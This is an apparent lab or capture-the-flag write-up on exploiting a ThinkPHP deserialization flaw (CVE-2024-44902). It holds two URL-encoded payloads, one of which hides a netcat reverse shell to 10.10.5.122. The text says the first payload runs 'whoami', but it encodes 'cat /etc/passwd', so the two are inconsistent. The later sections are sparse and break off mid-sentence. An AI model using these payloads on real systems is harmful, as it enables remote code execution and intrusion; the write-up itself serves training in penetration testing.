### Exploitation

Only HTTP port open, with the following number, which seems to be a version:

![](/assets/img/Pasted-image-20250126223838.png)

Then we have enough information to lookup for the name of the technology running on this port, and the only perfect match is ThinkPHP

![](/assets/img/Pasted-image-20250126223454.png)

While investigating, I found a vulnerability CVE-2024-44902 on ThinkPHP version 8.0.4:

![](/assets/img/Pasted-image-20250126224019.png)

The payload is an image so I have to extract the data from it, the OS command within the payload is `whoami`:
```bash
x=O%3A28%3A%22think%5Croute%5CResourceRegister%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00registered%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00resource%22%3BO%3A15%3A%22think%5CDbManager%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00instance%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A11%3A%22connections%22%3Ba%3A1%3A%7Bs%3A7%3A%22getRule%22%3Ba%3A2%3A%7Bs%3A4%3A%22type%22%3Bs%3A29%3A%22%5Cthink%5Ccache%5Cdriver%5CMemcached%22%3Bs%3A8%3A%22username%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22cat%20%2Fetc%2Fpasswd%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22fru1ts%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D%7D%7Ds%3A7%3A%22default%22%3Bs%3A7%3A%22getRule%22%3B%7D%7D%7D
```

And then the payload retrieves the information as follows:

![](/assets/img/Pasted-image-20250126230927.png)

Now the interesting part here, is that you need to provide the length of the payload you want to execute (number 6 for whoami), prior to sent the payload:

![](/assets/img/Pasted-image-20250126234525.png)

So in order to get a reverse shell, we get the length of the string and then change it by the 6 instead:

![](/assets/img/Pasted-image-20250126234859.png)

This is the payload I use:

```bash
x=O%3A28%3A%22think%5Croute%5CResourceRegister%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00registered%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00resource%22%3BO%3A15%3A%22think%5CDbManager%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00instance%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A11%3A%22connections%22%3Ba%3A1%3A%7Bs%3A7%3A%22getRule%22%3Ba%3A2%3A%7Bs%3A4%3A%22type%22%3Bs%3A29%3A%22%5Cthink%5Ccache%5Cdriver%5CMemcached%22%3Bs%3A8%3A%22username%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A32%3A%22%6e%63%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20%31%30%2e%31%30%2e%35%2e%31%32%32%20%31%32%33%34%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22fru1ts%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D%7D%7Ds%3A7%3A%22default%22%3Bs%3A7%3A%22getRule%22%3B%7D%7D%7D

### Privilege Escalation
There is a binary that can be executed as Sudo without credentials:
![](/assets/img/Pasted-image-20250126235201.png)

The content of such binary is this:
![](/assets/img/Pasted-image-20250126235216.png)

There is a Prototype Pollution vulnerability on `@bit/loader`:

![](/assets/img/Pasted-image-20250126235402.png)



### Post Exploitation

### Credentials

### Notes

-   Chisel have different configurations, this time we use a Forward SOCKS Proxy, which is a bind shell, that is not neccessarily the easiest way to forward the remote port, but is a new way to consider in case that a reverse shell is not possible.
-   Always look for exploits, analyze them and check if something can be useful to exploit the machine.
-   Chisel has some
